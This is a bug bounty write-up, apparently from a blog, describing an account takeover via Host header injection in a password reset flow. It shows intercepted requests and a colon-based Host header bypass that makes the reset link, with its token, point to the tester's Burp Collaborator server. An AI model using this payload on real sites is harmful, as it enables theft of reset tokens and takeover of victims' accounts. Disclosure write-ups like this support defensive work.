#header_injection #access_control #password_reset
# summary :
- attach burp collaborator in host header attack with links sent to victim like password reset link .
# report


![](https://miro.medium.com/v2/resize:fit:700/1*b071ti8HCTZ5VL2J4yloIQ.jpeg)

So I got an invite to a Private Bug bounty program on hackerone.com , The scope was very limited and its a 4 year old program , Initially it looked secured but I thought to give it a try .

So I straight away Jumped to check the Forgot Password functionality of the company main website .

I entered my email in forgot password field and intercepted the Request .
```
POST /auth/realms/Redacted/login-actions/reset-credentials?session_code=AbcdiQqKwDBsJcdIjZpAFW3&client_id=account&tab_id=Abcdii7y9i3qwXs HTTP/1.1  
Host: login.redacted.com  
Cookie: AUTH_SESSION_ID=fc59cdd34026abcd; KC_RESTART=AbcdiSldUIiiaXNFs  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 34  
Origin: https://login.redcated.com  
Referer: https://login.redacted.com/auth/realms/redacted/login-actions/reset-credentials?client_id=account&tab_id=Abcdi3qwXs  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1  
Te: trailers  
Connection: close  
  
username=testemail%40gmail.com
```


As you can see this Forgot password Request , First thought came in my mind is to test for Host header injection .

I attached my burp collaborator Url in the “Host” header like this :

Host: login.redacted.com.BurpcollaboratorUrl.com

I sent the request and nothing happened , it doesn’t worked .

Tried adding headers like “ X-forwarded-host “ and many more but it didn’t worked .

So now what? , lets think the other way .

After multiple attempts ,I found out that adding anything in the Host header will not work if it’s not ending with “ login.company.com” , As you have seen previously I have attached my burp collab URL at the end but It didn’t worked .

So now I tried to use burp collaborator Link at the start of the Host:

Host: burpcollaboratorUrl.com.login.redacted.com

Trying this I got forgot password link to my email and it was like this :

[https://abc.burpcollaborator.login.redacted.com/auth/realms/login-actions/action-token](https://abc.burpcollaborator.login.redacted..com/auth/realms/login-actions/action-token)?key=ey....

You can see here , although the BurpCollaborator URL reflected to the Password Reset link along with the token , but if you look closely the Server removed the “.com” of the burp collaborator URL and attached the company domain after it .

So technically , this makes it a Unknown Host ,Victim clicking on it will see “site can’t be reached” error . So basically as an attacker we cannot get any HTTP pingbacks to our Burp server that can give us the reset token .

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*vewDW4vsWyuL9eADQKS1og.png)

You can see Here , for request to work properly and to steal the token we need the password reset link like this :

https://abc.burpcollaborator.com/auth/realms/login-actions/action-token?key=ey....

At last , I tried to append a colon mark ( : )in the host header like this :

==Host: burpcollaboratorurl.com:login.redacted.com==

Final Request Looks like this now :
```
POST /auth/realms/redacted/login-actions/reset-credentials?session_code=Jabcde HTTP/1.1  
Host: abcd.burpcollaborator.com:login.redacted.com  
Cookie: AUTH_SESSION_ID=abcdfc59cdd34026.keycloak-482-keycloak-aaalzz4; Lpaa1sXBBnfZiwyvqXMPW2E5/ikwW6fuTZCg+XlvBMY9yeptovpOaJM2xmkK0=; _ga=GA1.2.1343917884.1641975182;   
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 34  
Origin: https://login.redacted.com  
Referer: https://login.redacted.com/auth/realms/login-actions/reset-credentials  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1  
Te: trailers  
Connection: close  
  
username=testemail%40gmail.com
```


Sent the request and BoooM!

This time I bypassed it and server send the Link the way we wanted it to be .

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*RfUMEDj1-grYDXLJkAsQdg.png)

You can see now the Burp collaborator Url will work and has a token atftached to it .

Clicking on it executes the collaborator and I got HTTP pingbacks .

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*RWwtXhiBeg8CL7Au4q_c2A.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*IMhEGWEfSq1mwQHotXmGQQ.png)

Successfully Got the Reset Token and completely able to takeover Victim Account .

Now You might be thinking why and how that colon “ :” mark worked in the Host header . Well here is the explanation from the company internal team .
# link
https://medium.com/@deepanshudev369/interesting-story-of-an-account-takeover-vulnerability-140a45a058a3